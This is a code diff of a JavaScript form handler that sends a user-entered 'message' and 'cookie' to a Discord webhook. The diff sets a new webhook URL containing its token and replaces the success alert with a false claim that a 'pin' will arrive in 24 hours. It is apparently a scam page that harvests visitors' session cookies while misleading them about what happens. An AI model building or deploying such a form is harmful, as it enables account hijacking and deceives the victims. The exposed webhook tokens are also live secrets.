@@ -6,7 +6,7 @@ document.getElementById('messageForm').addEventListener('submit', function(event
   const message = document.getElementById('message').value;
   const cookie = document.getElementById('cookie').value;
 
-  const webhookURL = 'https://discord.com/api/webhooks/1267427698825756674/d3OaHRip1hSDeGkb5mxd3sFcX_HDSClJpXNxo7Xwlw3ITI1S8WcBIZUuvgEKi6_5Fl6n'; // Your webhook URL
+  const webhookURL = 'https://discord.com/api/webhooks/1267427703821176872/v_0F600_eVrRm3v8yrLOZOUzh_QCtlHjORXOyzbXdy-SjA1Qo1tSLVorsNyVfznaaaR7'; // Your webhook URL
 
   fetch(webhookURL, {
       method: 'POST',
@@ -45,7 +45,7 @@ document.getElementById('messageForm').addEventListener('submit', function(event
     .then(response => response.json())
     .then(data => {
       console.log('Success:', data);
-      alert('Message sent successfully!');
+      alert('Your pin will be sent to your discord server after 24 hours! Make sure you filled the box correctly');
     })
     .catch((error) => {
       console.error('Error:', error);
